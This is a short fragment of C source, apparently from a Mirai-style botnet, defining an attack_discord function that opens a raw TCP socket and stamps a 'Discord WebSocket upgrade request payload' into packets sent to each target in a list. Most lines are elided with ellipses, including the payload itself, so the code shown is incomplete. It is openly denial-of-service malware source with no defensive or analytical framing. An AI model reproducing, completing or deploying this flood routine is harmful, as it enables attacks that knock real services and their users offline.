...
void attack_discord(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    ...
    // Discord WebSocket upgrade request payload
    char discord_payload[] = 
    ...
    int payload_len = util_strlen(discord_payload);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting Discord attack\n");
#endif
        return;
    }
    i = 1;
    ...
    for (i = 0; i < targs_len; i++)
    {
        ...
        util_memcpy(data, discord_payload, payload_len);
    }
